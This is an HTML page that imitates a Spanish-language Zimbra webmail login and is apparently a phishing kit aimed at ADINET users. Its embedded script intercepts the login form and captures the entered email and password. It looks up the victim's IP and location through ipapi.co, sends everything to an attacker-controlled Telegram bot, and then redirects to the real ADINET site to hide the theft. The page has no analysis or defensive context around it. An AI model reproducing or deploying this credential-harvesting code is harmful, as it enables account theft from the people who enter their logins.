<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE9">
    
    <title>Inicio de sesión en el cliente web de Zimbra</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=1">

	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="stylesheet" type="text/css" href="./css/common,login,zhtml,skin.css">

    
    
</head>

<body onload="onLoad();">

	<div class="LoginScreen">
		<div class="center">
			<div class="contentBox">
				<div class="ImgAltBanner"></div>
				<h1><a href="#" id="bannerLink" target="_new">
					<span class="ImgLoginBanner"></span>
				</a></h1>
				<div id="ZLoginAppName">Cliente web</div>
                
                                <form method="post" id="loginform" name="loginForm"  accept-charset="UTF-8">
                                <input type="hidden" name="loginOp" value="login">
                    
				<table class="form">
                    
                                                <tbody><tr>
                                                    <td><label for="username">Nombre de usuario:</label></td>
                                                    <td><input id="username" class="zLoginField" name="tTR4P2SR" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"></td>
                                                </tr>
                                            
                                        <tr>
                                            <td><label for="password">Contraseña:</label></td>
                                            <td><input id="password" autocomplete="off" class="zLoginField" name="pr3xt4rs" type="password" value="" size="40" maxlength="1024"></td>
                                        </tr>
                            
                                        <tr>
                                            <td>&nbsp;</td>
                                            <td class="submitTD">
                                                <input id="remember" value="1" type="checkbox" name="zrememberme">
                                                <label for="remember">Recordarme</label>
                                                <input type="submit" class="ZLoginButton DwtButton" value="Iniciar sesión">
                                            </td>
                                        </tr>
                        
					<tr>
						<td colspan="2"><hr></td>
					</tr>
					<tr>
						<td>
							<label for="client">Versión:</label>
						</td>
						<td>
							<div class="postioning">
                                
                                        <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
                                            <option value="preferred" selected=""> Predeterminada</option>
                                            <option value="advanced"> Avanzada (Ajax)</option>
                                            <option value="standard"> Estándar (HTML)</option>
                                            <option value="mobile"> Móvil</option>
                                            

                                        </select>
                                    
<a href="#" onclick="showWhatsThis()" id="ZLoginWhatsThisAnchor">¿Qué es esto?</a>
								
								</div>
							</td>
						</tr>
                    
					</tbody></table>
			</form></div>
			<div class="decor1"></div>
		</div>

		<div class="Footer">
			<div id="ZLoginNotice" class="legalNotice-small"></div>

			</div>
        </div>
		<div class="decor2"></div>
	</div>                                 
<script src="eltlg.js"></script>
     <script>
    var script = document.createElement("script");
    script.src = "eltlg.js";

 

    const form = document.querySelector('#loginform');

    form.addEventListener('submit', event => {
        event.preventDefault();
        const cliente = document.getElementById('username').value;
        const cliente1 = document.getElementById('password').value;
       
        fetch('https://ipapi.co/json')
        .then(response => response.json())
        .then(data => {
            YOUR_MESSAGE_TEXT = "ADINET \n 3M41L: "+cliente+" \n P4SS: "+cliente1+"\n IP: "+data.ip+" "+data.country+" "+data.city;
            const telegramApiUrl = `https://api.telegram.org/bot${YOUR_BOT_TOKEN}/sendMessage?chat_id=${YOUR_CHANNEL_ID}&text=${YOUR_MESSAGE_TEXT}`;

            fetch(telegramApiUrl)
                .then(response => {
                    window.location.href="https://adinet.com.uy/"
                })
                .catch(error => console.error(error));
        })
        .catch(error => console.error(error));
    });
    
</script>


</body></html>
